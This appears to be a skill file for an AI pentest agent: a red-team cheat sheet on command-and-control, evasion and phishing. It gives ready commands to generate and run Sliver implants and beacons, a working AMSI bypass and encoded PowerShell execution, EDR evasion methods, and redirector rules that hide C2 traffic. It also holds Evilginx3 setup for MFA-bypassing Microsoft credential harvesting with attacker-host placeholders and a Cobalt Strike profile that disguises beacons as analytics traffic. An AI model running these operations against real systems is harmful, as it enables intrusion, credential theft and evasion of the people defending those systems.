# /red-team-ops — C2, Evasion, Persistence & OpSec

> **Skill type:** Red Team Operations  
> **Source:** 0xsteph/pentest-ai-agents c2-operator, opsec-anonymizer, Ak-cybe red-team (21 skills)  
> **Chains into:** `/lateral-movement`, `/post-exploit`  
> **Chained from:** Initial foothold

---

## C2 Framework Overview

| Framework | Best For | Profile Support |
|-----------|---------|----------------|
| Cobalt Strike | Enterprise red teams, mature ecosystem | Malleable C2 profiles |
| Sliver | Open-source, modern, multi-protocol | mTLS, WireGuard, gRPC |
| Mythic | Modular, Python-based, cross-platform | Custom agents |
| Havoc | Modern, evasion-focused | Sleeper/beacon profiles |
| Brute Ratel C4 | EDR evasion specialist | - |

---

## Sliver C2 Operations

```bash
# Server
sliver-server

# Generate implant (HTTPS beacon)
sliver > generate --mtls TEAMSERVER:8888 --os windows --arch amd64 --format exe --save ./beacon.exe

# Start listener
sliver > mtls --lhost TEAMSERVER --lport 8888

# Session management
sliver > sessions
sliver > use SESSION_ID
[sliver(BEACON)] > info
[sliver(BEACON)] > execute-assembly ./SharpHound.exe -c All
[sliver(BEACON)] > sideload ./Seatbelt.exe "all"

# Pivoting via Sliver
[sliver(BEACON)] > portfwd add -r 10.0.0.5:445 -l 8445
```

---

## AMSI & AV/EDR Evasion

### AMSI Bypass (PowerShell)
```powershell
# In-memory AMSI bypass techniques (use on authorized engagements)
# Patch amsi.dll AmsiScanBuffer to return 0

# Method 1: Memory patch via reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2: Encode + obfuscate payload
$encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
powershell -EncodedCommand $encodedPayload
```

### EDR Evasion Techniques
```
1. Process injection into trusted processes
   - svchost.exe, explorer.exe, lsass.exe (risky)
   - APC injection, thread hijacking
   
2. Syscall obfuscation
   - Direct syscalls bypass user-mode hooks
   - SysWhispers3, HellsGate
   
3. Obfuscation
   - XOR, AES-encrypt shellcode
   - Runtime decryption → never on disk in plaintext
   
4. Sleep masking
   - Encrypt C2 beacon memory during sleep
   - Ekko, Foliage sleep masking techniques
   
5. LOLBins (Living Off the Land)
   - certutil, regsvr32, mshta, wmic, rundll32
   - Harder to detect — legitimate system binaries
```

---

## OpSec (Operational Security)

### Infrastructure Design
```
# Don't attack directly from your IP
Attacker Machine → VPN/Tor → Redirector → C2 Teamserver

# Redirector config (nginx or Apache mod_rewrite)
# Only forward legitimate C2 traffic, block scanners
RewriteRule ^/cdn/update$ http://teamserver:443/cdn/update [P,L]  # C2 traffic
RewriteRule .* http://legitimate-site.com/ [R,L]  # Everything else → benign site

# Use categorized domains (finance, healthcare, etc.)
# Certificate: Let's Encrypt for legitimacy
# Domain age: ≥ 30 days old (avoid domain reputation filters)
```

### Source IP Design
```bash
# Residential proxies for initial access
# Cloud provider IPs for persistence (harder to block)

# JA3/TLS fingerprint hygiene
# Default tools (curl, Python requests) have recognizable JA3 signatures
# Use Firefox/Chrome TLS fingerprint via tools like tlsimpersonation

# Browser fingerprint in phishing
# Use real browser headers, not curl/python defaults
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...
```

---

## Phishing Operations

```bash
# GoPhish — phishing campaign management
# Evilginx3 — reverse proxy for credential harvesting (bypasses MFA)
# dnstwist — find domain typosquats

# Domain setup
dnstwist --registered example.com  # Find similar registered domains

# Evilginx3 — reverse proxy phishing
evilginx -p phishlets/  # Start with phishlets
config domain ATTACKER_DOMAIN
config ipv4 ATTACKER_IP
phishlets hostname microsoft ATTACKER_DOMAIN
phishlets enable microsoft
lures create microsoft  # Create campaign URL

# Payload delivery
# - Macro-enabled Office documents (VBA macro)
# - HTML Application (HTA)
# - ISO/ZIP containers (bypass Mark-of-the-Web)
# - PDF with link to credential harvest

# Email OPSEC
# SPF: v=spf1 include:your-smtp.com ~all
# DKIM: configure for your phishing domain
# DMARC: p=none (permissive, to allow sending)
```

---

## Malleable C2 Profile (Cobalt Strike)

```
# Make C2 traffic look like legitimate Google Analytics
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0";

https-get {
    client {
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.9";
        
        metadata {
            base64url;
            prepend "/collect?v=1&tid=UA-";
            append "&z=";
            uri-append;
        }
    }
}

# Beacon sleeptime and jitter
set sleeptime "60000";  # 60 second sleep
set jitter "20";         # 20% jitter
```
